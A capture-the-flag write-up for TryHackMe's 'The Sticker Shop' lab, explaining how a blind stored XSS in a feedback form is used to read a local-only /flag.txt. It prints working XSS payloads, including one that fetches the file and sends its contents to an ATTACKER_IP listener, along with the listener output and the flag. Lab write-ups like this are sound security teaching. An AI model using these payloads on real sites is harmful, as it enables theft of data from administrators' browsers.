# The Sticker Shop — TryHackMe Writeup

Target: The Sticker Shop
Platform: TryHackMe
Difficulty: Easy
Category: Web, XSS


## Recon

nmap scan shows two open services:

22/tcp    open  ssh   OpenSSH 8.2p1 Ubuntu
8080/tcp  open  http  Werkzeug httpd 3.0.1 (Python 3.8.10)

The web service on port 8080 runs a Python application using the Werkzeug development server.

No robots.txt or interesting directories were discovered.


## Key Hint

"They decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback."

This strongly suggests that the admin reviews feedback using a browser running on the same machine as the web server.

The challenge goal is to read:

http://10.49.133.57:8080/flag.txt

Direct access is blocked, implying that the resource is only accessible locally.


## Attack Surface

The application exposes a feedback submission endpoint:

/submit_feedback

User input submitted through this form appears to be stored and later viewed by an administrator.


## Vulnerability — Blind Stored XSS

### Step 1 — Verify XSS Execution

Start a local listener:

python3 -m http.server 8000

Submit the following payload in the feedback form:

<img src="http://ATTACKER_IP:8000/test">

Listener output:

::ffff:10.49.133.57 - - "GET /test HTTP/1.1" 404 -

This confirms that the payload is executed when the admin reviews the feedback.

Blind Stored XSS confirmed.


## Exploit Strategy

Because the admin browser runs on the same machine as the server:

browser request to /flag.txt
→ resolves to localhost
→ bypasses external access restrictions

We can therefore use JavaScript to fetch the local file and exfiltrate it.


## Exploit Payload

Submit the following payload via the feedback form:

<img src=x onerror="
fetch('/flag.txt')
.then(r=>r.text())
.then(x=>new Image().src='http://ATTACKER_IP:8000/?f='+x)
">


## Catch the Flag

Listener output:

python3 -m http.server 8000

Incoming request:

::ffff:10.49.133.57 - - "GET /?f=THM{83789a69074f636f64a38879cfcabe8b62305ee6} HTTP/1.1" 200 -


## Flag

THM{83789a69074f636f64a38879cfcabe8b62305ee6}


## Exploit Chain

Attacker
   │
   │ submit feedback (XSS payload)
   ▼
Server stores payload
   │
   ▼
Admin browser opens feedback page
   │
   ▼
JavaScript executes in admin context
   │
   ▼
Browser fetches /flag.txt (localhost)
   │
   ▼
Flag exfiltrated to attacker server


## Summary

Step            Technique
Recon           Port scan, analyze application context
Identification  Blind Stored XSS via feedback form
Verification    External callback using <img src>
Exploit         fetch('/flag.txt') → exfiltration via image request
Flag            Captured on attacker HTTP listener


## Takeaway

Blind XSS becomes significantly more dangerous when executed in privileged contexts such as an administrator's browser. If the admin browser runs on the same machine as the web server, relative paths like /flag.txt resolve locally. This allows attackers to access internal resources that are otherwise inaccessible from external networks.
